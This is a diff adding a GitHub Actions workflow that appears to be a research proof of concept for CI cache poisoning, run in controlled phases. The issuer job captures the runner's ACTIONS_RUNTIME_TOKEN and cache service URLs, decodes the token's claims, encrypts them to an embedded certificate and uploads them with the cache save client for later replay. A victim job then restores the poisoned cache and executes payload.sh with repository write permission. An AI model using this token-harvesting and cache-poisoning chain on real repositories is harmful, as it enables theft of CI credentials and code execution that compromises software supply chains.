@@ -1,0 +1,184 @@
+name: c8-post-job-write-chain
+
+on:
+  workflow_dispatch:
+    inputs:
+      phase:
+        description: Controlled C8 matrix phase
+        required: true
+        type: choice
+        options:
+          - issuer
+          - victim-control
+          - victim-treatment
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  issuer:
+    if: inputs.phase == 'issuer'
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    cache-mode: write-only
+    steps:
+      - name: Create current-token write proof
+        run: |
+          mkdir -p .cache-c8-issuer-proof
+          printf 'issuer-write-proof-c8-%s\n' "$GITHUB_RUN_ID" > .cache-c8-issuer-proof/proof.txt
+      - name: B1 save with current write-only token
+        uses: actions/cache/save@v4
+        with:
+          path: .cache-c8-issuer-proof
+          key: c8-issuer-proof-${{ github.run_id }}
+      - name: Seal issuer tuple and official save client
+        uses: actions/github-script@v8
+        env:
+          C8_RECIPIENT_CERT_B64: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVGVENDQW4yZ0F3SUJBZ0lVVzN5VVpQVjRoYko4M3JZVWcrMjZSUVJyT25nd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dqRVlNQllHQTFVRUF3d1BZemd0WTJGamFHVXRjbVZ3YkdGNU1CNFhEVEkyTURreE56RXlOVFl6TmxvWApEVEkyTURreE9ERXlOVFl6Tmxvd0dqRVlNQllHQTFVRUF3d1BZemd0WTJGamFHVXRjbVZ3YkdGNU1JSUJvakFOCkJna3Foa2lHOXcwQkFRRUZBQU9DQVk4QU1JSUJpZ0tDQVlFQWo3N09YZmNnbk00ckJobnREbHpac3g0eWtMakwKSG1qTnRWMmNBaTlUZ2s1NXJLZFZsR3lPWS92T0MxNE01QlZBVThkMVRyeDNnSlJZNGtGVnJDcmtGb01iRDNPMgpvY3BHbVpqMVdKSE8ycnpGcWV4MGhOTE1LdzZZT2pLM0lucktWYzhpMTRUVll3L1IxUEVKOHMwVXFpMXNRSE93Cm84dWdpdVN0cXN4c0VLcVpQc0ZFUzNhekNLRW9xZysyemk5VXJjalVOblJLZkN1UUNLNXdHQ1V5Z0E0anhUZlIKenM0WFovQkdGL3NWRzJobkpKQTVieVhtUUJTYk9QdXR4aXJVVWtMZW5VeTZZWVpxY3k0SGFwaXdDa0xrZzc4Wgo2dER0aTc0bHFmbEpxWFJVcjZicDRzTCtNVUZBeXd4UXI5eXZ6OVJMWHd3Mis0TFdXQVp2ek5nVHNsbURhMTFlCnBaN2pwNnZmT09VcjFmSlB0SzFtYWs5SEVwQnhnUnZ1c1pLWU5RWFNsYXV6ZnR2OTVCc3NRTkdYalRBNTBwVnAKdEtBcU5IZEVBVERFMW9lKzJGcmZ1MlJ6MGVwRnFwYzZtQTkwYVl3a0JINDZFWWwzTDZpOVdQUlhDNS9EMGgwVwpac1NXemtKNkNYQlRTRGM2c1ZSNDA2anhPa3E2ZVhHWnplS2pBZ01CQUFHalV6QlJNQjBHQTFVZERnUVdCQlJDCk1SVjNTQ0NqNnF0c2swbzh2bHdZdndPM25qQWZCZ05WSFNNRUdEQVdnQlJDTVJWM1NDQ2o2cXRzazBvOHZsd1kKdndPM25qQVBCZ05WSFJNQkFmOEVCVEFEQVFIL01BMEdDU3FHU0liM0RRRUJDd1VBQTRJQmdRQmtqaDI2dVFvZgpVU0JSYVZXSnBpdGZzbmJzN0Z0aHlaTTAwKzExNUlDZHZXKzYrS25yQnZmS0ZTakF1bUV2YXhQS2ZrVUhDSmM4CkxCc1krN2RTRnZvZFlkZThpSVFXMFVvVWZJS3RabGRmL2Mxc2FPSm82OGZTZVpGL3VkRFNuemxsMDZsbmRPZ1QKSHA1VDBuZEdocG0xaGJmamdNSk5IVm5xT1ZJN2ZOODZrbVFxSFBROGtGdGg1VFpVbXg0NDEzTURDOFpwcDdMOQpUNmhFaU1RclpuYlFyRWxWM1h6dkhjNEsvSmQ4UXBRZHJWc2pPR3oxcFN4MmJNYktvV0xIbEZBMXFMUGkvZXByCndhQjVDZDN5UkN0L1dkME5wc0hVRDFwNStVSGQxbDZDZ3p6ejZveGpTOGMxRWQzWS9ocWpjUnZ0K29KVi9DRTEKZ00zWXV3bGRBQmZLZTRBNkJIMkQ3NHc3SDRKZ0cyVlp6NGU0TjNpTVg0NHc0M0pzT1hLZ0JiV0l2UnN2QkxzNwpYS3pUb1lZQ0tUcE5PUkNCMStuejFJQ1NhY3BiSkI1c2FiSjB0UUcrOXNwK204Y3drTUdHaW1DTGZHZjRLeStGClk0MHNublE4bW4ySDRlamFVb3MrN1p0dzVoUTFHN1B3c053U1B0TnVRSmlubmh1blh6cHdxb0k9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
+        with:
+          script: |
+            const fs = require("fs");
+            const path = require("path");
+            const childProcess = require("child_process");
+            for (const field of ["ACTIONS_RUNTIME_TOKEN", "ACTIONS_RESULTS_URL"]) {
+              if (!process.env[field]) throw new Error(`missing ${field}`);
+            }
+            if (process.env.ACTIONS_CACHE_MODE !== "write-only") {
+              throw new Error(`unexpected cache mode: ${process.env.ACTIONS_CACHE_MODE}`);
+            }
+            const bundle = path.join(process.env.GITHUB_WORKSPACE, "c8-replay");
+            const plaintext = path.join(process.env.RUNNER_TEMP, "c8-payload.json");
+            const cert = path.join(process.env.RUNNER_TEMP, "c8-recipient-cert.pem");
+            fs.mkdirSync(bundle, {recursive: true});
+            const fields = [
+              "ACTIONS_RUNTIME_TOKEN",
+              "ACTIONS_CACHE_URL",
+              "ACTIONS_RESULTS_URL",
+              "ACTIONS_CACHE_SERVICE_V2",
+              "ACTIONS_CACHE_MODE",
+              "GITHUB_REF",
+              "GITHUB_REPOSITORY",
+              "GITHUB_SHA",
+              "RUNNER_OS",
+              "RUNNER_ARCH",
+            ];
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            let tokenFormat = "opaque";
+            let tokenClaims = {};
+            const parts = token.split(".");
+            if (parts.length === 3) {
+              try {
+                const padded = parts[1].replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(parts[1].length / 4) * 4, "=");
+                const decoded = JSON.parse(Buffer.from(padded, "base64").toString("utf8"));
+                tokenFormat = "jwt";
+                for (const name of ["iat", "nbf", "exp", "iss", "aud", "ac", "job_id", "run_id", "sha"]) {
+                  if (Object.prototype.hasOwnProperty.call(decoded, name)) tokenClaims[name] = decoded[name];
+                }
+              } catch (_) {
+                tokenFormat = "three-segment-unparsed";
+              }
+            }
+            fs.writeFileSync(
+              plaintext,
+              JSON.stringify(Object.fromEntries(fields.map(field => [field, process.env[field] || ""]))),
+              {mode: 0o600},
+            );
+            fs.writeFileSync(cert, Buffer.from(process.env.C8_RECIPIENT_CERT_B64, "base64"), {mode: 0o600});
+            childProcess.execFileSync("openssl", [
+              "cms", "-encrypt", "-binary", "-aes-256-cbc",
+              "-in", plaintext,
+              "-out", path.join(bundle, "c8-payload.p7m"),
+              "-outform", "DER",
+              "-recip", cert,
+            ]);
+            fs.rmSync(plaintext);
+            fs.rmSync(cert);
+            const actionRoot = path.resolve(
+              process.env.GITHUB_WORKSPACE,
+              "..", "..", "_actions", "actions", "cache", "v4",
+            );
+            const saveBundle = path.join(actionRoot, "dist", "save-only", "index.js");
+            if (!fs.existsSync(saveBundle)) throw new Error("save-only bundle missing");
+            childProcess.execFileSync("tar", [
+              "-C", actionRoot,
+              "-czf", path.join(bundle, "actions-cache-v4-save.tgz"),
+              "save/action.yml", "dist/save-only/index.js",
+            ]);
+            fs.writeFileSync(
+              path.join(bundle, "metadata.json"),
+              JSON.stringify({
+                issuerRunId: process.env.GITHUB_RUN_ID,
+                issuerProofKey: `c8-issuer-proof-${process.env.GITHUB_RUN_ID}`,
+                issuerCaptureUtc: new Date().toISOString(),
+                tokenFormat,
+                tokenClaims,
+              }),
+            );
+      - name: Upload encrypted issuer carrier
+        uses: actions/upload-artifact@v4
+        with:
+          name: c8-replay-${{ github.run_id }}
+          path: c8-replay/
+          if-no-files-found: error
+          retention-days: 1
+
+  victim-control:
+    if: inputs.phase == 'victim-control'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    cache-mode: read
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v5
+      - name: Read trusted future key
+        id: key
+        run: |
+          value="$(tr -d '\r\n' < c8-future-key.txt)"
+          [[ "$value" =~ ^[a-z0-9]{16,64}$ ]]
+          printf 'value=%s\n' "$value" >> "$GITHUB_OUTPUT"
+      - name: B1 prove future key is absent before poisoning
+        id: restore
+        uses: actions/cache/restore@v4
+        with:
+          path: .cache-c8-victim
+          key: c8-victim-${{ steps.key.outputs.value }}
+      - name: Assert exact cache miss
+        run: |
+          test '${{ steps.restore.outputs.cache-hit }}' != 'true'
+          test ! -e .cache-c8-victim/payload.sh
+
+  victim-treatment:
+    if: inputs.phase == 'victim-treatment'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    cache-mode: read
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v5
+      - name: Read trusted future key
+        id: key
+        run: |
+          value="$(tr -d '\r\n' < c8-future-key.txt)"
+          [[ "$value" =~ ^[a-z0-9]{16,64}$ ]]
+          printf 'value=%s\n' "$value" >> "$GITHUB_OUTPUT"
+      - name: L1 restore post-job poisoned cache
+        id: restore
+        uses: actions/cache/restore@v4
+        with:
+          path: .cache-c8-victim
+          key: c8-victim-${{ steps.key.outputs.value }}
+          fail-on-cache-miss: true
+      - name: L1 execute exact restored payload and read state back
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          test '${{ steps.restore.outputs.cache-hit }}' = 'true'
+          test "$(cat .cache-c8-victim/payload-id.txt)" = 'c8-post-job-write-c8-victim-${{ steps.key.outputs.value }}'
+          bash .cache-c8-victim/payload.sh
+          proof_branch="$(cat .cache-c8-victim/proof-branch.txt)"
+          test "$proof_branch" = "c8-proof-${GITHUB_RUN_ID}"
+          test "$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${proof_branch}" --jq .object.sha)" = "$GITHUB_SHA"
+
